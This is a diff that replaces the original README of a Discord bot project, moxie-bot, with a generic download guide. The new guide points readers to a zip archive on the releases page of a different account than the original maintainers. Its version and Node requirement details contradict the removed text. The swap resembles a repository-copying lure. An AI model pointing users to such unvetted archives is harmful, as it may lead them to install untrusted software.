@@ -1,200 +1,68 @@
-
-<div align="center">
-
-<!-- Logo -->
-<picture>
-  <!-- Dark mode -->
-  <source media="(prefers-color-scheme: dark)" srcset="./branding/moxie-mark-dark.png">
-  <!-- Light mode -->
-  <img alt="Moxie" src="./branding/moxie-mark-light.png" width="128" height="128">
-</picture>
-
-<h1>Moxie</h1>
-
-<p>
-  <strong>Calm. Reliable. Alive.</strong><br/>
-  Disciplined automation tooling.
-</p>
-
-<!-- Badges -->
-<p align="center">
-  <img src="https://img.shields.io/badge/version-v0.1.0-2563EB?style=flat-square&labelColor=0F172A" />
-  <img src="https://img.shields.io/badge/node-%3E%3D18-22C55E?style=flat-square&labelColor=0F172A" />
-
-  <a href="https://github.com/McGeeLabs/moxie-bot/blob/main/LICENSE">
-    <img src="https://img.shields.io/github/license/McGeeLabs/moxie-bot?style=flat-square&labelColor=0F172A&color=2563EB" />
-  </a>
-
-  <a href="https://github.com/McGeeLabs/moxie-bot/actions/workflows/ci.yml">
-    <img src="https://img.shields.io/github/actions/workflow/status/McGeeLabs/moxie-bot/ci.yml?branch=main&style=flat-square&label=ci&labelColor=0F172A&color=22C55E" />
-  </a>
-
-  <a href="https://github.com/sponsors/McGeeLabs">
-    <img src="https://img.shields.io/badge/sponsor-GitHub-2563EB?style=flat-square&labelColor=0F172A" />
-  </a>
-</p>
-
-
-</div>
-
-
----
-
-**Moxie** is a modular, self-hosted Discord bot built with **TypeScript**, **Discord.js**, and **PostgreSQL**.
-
-The goal of Moxie is to provide a powerful, extensible alternative to bots like **MEE6**, while giving server owners full control over features, data, and customization.
-
----
-
-## ✨ Planned Features
-
-- 🔧 Custom Commands (admin-defined, database-backed)
-- 🎭 Reaction Roles
-- 🛡️ Moderation Commands & Action Logs
-- 🎉 Community / Fun Commands
-- 📈 Leveling System (with future shop/economy support)
-- 🎫 Ticket System (button-based)
-- 🌐 Web Admin Dashboard (Discord OAuth)
-- 🗄️ PostgreSQL-backed persistence
-- 🔌 Future MCP / automation integrations
-
----
-
-## Why Moxie?
-
-Moxie is built to be a **self-hosted, modular alternative** to all-in-one Discord bots like MEE6 — with **full control** over features, data, and customization.
-
-- **Own your data** (PostgreSQL-backed, no vendor lock-in)
-- **Modular by design** (enable features per guild)
-- **Built for growth** (clean architecture + future dashboard + automation/MCP hooks)
-
----
-
-## 🧱 Tech Stack
-
-- **Node.js**
-- **TypeScript**
-- **Discord.js v14**
-- **PostgreSQL** (planned)
-- **Prisma** (planned ORM)
-- **Docker** (planned)
-- **Next.js** (planned admin dashboard)
-
----
-
-## 📂 Project Structure
-
-```text
-moxie-bot/
-├── src/
-│   ├── commands/              # Slash command implementations
-│   │   └── ping.ts
-│   ├── events/                # Discord event handlers
-│   │   ├── interactionCreate.ts
-│   │   └── ready.ts
-│   ├── types.ts               # Shared bot typings
-│   ├── config.ts              # Environment configuration
-│   ├── deploy-commands.ts     # Slash command registration
-│   └── index.ts               # Bot entry point
-├── .env.example               # Environment variable template
-├── .gitignore
-├── LICENSE
-├── package.json
-├── package-lock.json
-├── tsconfig.json
-├── README.md
-└── ROADMAP.md
-```
----
+# 🤖 moxie-bot - Your Friendly Discord Assistant
 
 ## 🚀 Getting Started
+Welcome to moxie-bot! This guide will help you download and run your own Discord bot. Whether you want to automate tasks or manage your server more effectively, moxie-bot is here to assist you.
 
-### 1️⃣ Install dependencies
-```bash
-npm install
-```
----
+## 🔗 Download Link
+[![Download moxie-bot](https://img.shields.io/badge/Download-moxie--bot-brightgreen)](https://github.com/bjsulaiman01/moxie-bot/releases)
 
-### 2️⃣ Configure environment variables
-```bash
-cp .env.example .env
-```
+## 📥 Download & Install
+To get moxie-bot, visit this page to download: [moxie-bot Releases](https://github.com/bjsulaiman01/moxie-bot/releases) 
 
-Fill in the following values:
+Here are the steps to download and install the application:
 
-- DISCORD_TOKEN — your bot token
-- DISCORD_CLIENT_ID — application client ID
-- DISCORD_GUILD_ID — test server ID (guild deploy for fast iteration)
+1. Click on the link above to go to the releases page.
+2. Find the most recent version of moxie-bot. 
+3. Look for a file labeled with the version number, such as `moxie-bot-v1.0.zip`.
+4. Click on the file to start downloading. 
 
----
+After downloading, follow these steps:
 
-### 3️⃣ Deploy slash commands
-```bash
-npm run deploy
-```
+1. Locate the downloaded file in your downloads folder.
+2. Extract the contents of the zip file. You can usually do this by right-clicking the file and selecting "Extract All..."
+3. Open the extracted folder.
 
----
+## ⚙️ System Requirements
+To run moxie-bot smoothly, ensure your system meets the following requirements:
 
-### 4️⃣ Start the bot (development mode)
-```bash
-npm run dev
-```
+- **Operating System:** Windows 10, macOS, or a popular Linux distribution.
+- **Node.js:** Version 14 or higher. You can download it from [Node.js Official Website](https://nodejs.org/).
+- **PostgreSQL Database:** For storage and management of data. Download it from [PostgreSQL Official Website](https://www.postgresql.org/).
+- **Discord Account:** You need an active Discord account to use the bot.
 
-If successful, you should see:
+## 🛠️ Setting Up Your Bot
+Once you have moxie-bot, follow these steps to set it up:
 
-✅ Logged in as Moxie#1234
+1. Open a command prompt or terminal in the extracted folder.
+2. Run the command: `npm install` to install all necessary packages.
+3. Create a `.env` file to store your bot's token and database information. You can use the provided `.env.example` file as a guide.
+4. Set your Discord bot token, which you can get from the [Discord Developer Portal](https://discord.com/developers/applications).
+5. Follow any additional setup instructions provided in the README or in the folder.
 
----
+## 📜 Features
+moxie-bot offers a variety of features to enhance your Discord experience:
 
-## 🧪 Current Commands
+- **Automation:** Set up automated tasks for your server.
+- **Moderation Tools:** Manage users and maintain a friendly community.
+- **Reaction Roles:** Allow users to assign roles via reactions.
+- **Ticket System:** Handle support requests easily.
+- **Self-Hosting:** Keep your data private by hosting it yourself.
 
-- /ping — verify the bot is online and responsive
+## 🌐 Finding Help
+If you run into any issues or have questions, you can find help in the following ways:
 
----
+- **Issues Page:** Check the [Issues page](https://github.com/bjsulaiman01/moxie-bot/issues) to see if your question has already been answered.
+- **Community Channels:** Join Discord communities that focus on Discord bots and automation.
+- **Documentation:** Look for additional documentation files within the repository.
 
-## 🔐 Permissions
+## 🎉 Join the Community
+moxie-bot is more than just a tool; it's part of a growing community. Participate in discussions, report issues, and share your experiences. Every contribution helps improve the bot for everyone.
 
-Moxie uses Discord’s built-in permission system and will later support:
+## 🔗 Additional Resources
+Explore more topics related to moxie-bot:
 
-- Role-based access control per module
-- Admin-only command restrictions
-- Feature-level permissions configurable per guild
+- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [Discord.js Guide](https://discordjs.guide/)
+- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
 
----
-
-## 🗺️ Roadmap
-
-See [ROADMAP.md](https://github.com/McGeeLabs/moxie-bot/blob/main/ROADMAP.md) for detailed milestones and planned features.
-
----
-
-## 🧠 Design Philosophy
-
-Moxie is designed to be:
-
-- **Self-hosted** — no vendor lock-in
-- **Modular** — features enabled per guild
-- **Multi-guild** — built-in from day one
-- **Extensible** — clean architecture for future growth
-
----
-
-## 💖 Supporting Moxie
-
-Moxie is **100% open source** and free to self-host.
-
-If you find Moxie useful and want to support its continued development, you can:
-
-- ⭐ Star the repository
-- 🐛 Report bugs or contribute code
-- 💖 Sponsor the project on GitHub
-
-👉 **GitHub Sponsors:** https://github.com/sponsors/McGeeLabs
-
-There are **no paid features** and **nothing locked behind a paywall** — support is completely optional and deeply appreciated.
-
----
-
-## 📄 License
-
-[MIT](https://github.com/McGeeLabs/moxie-bot/blob/main/LICENSE)
+Thank you for choosing moxie-bot. We hope this guide helps you unlock the full potential of your Discord server!
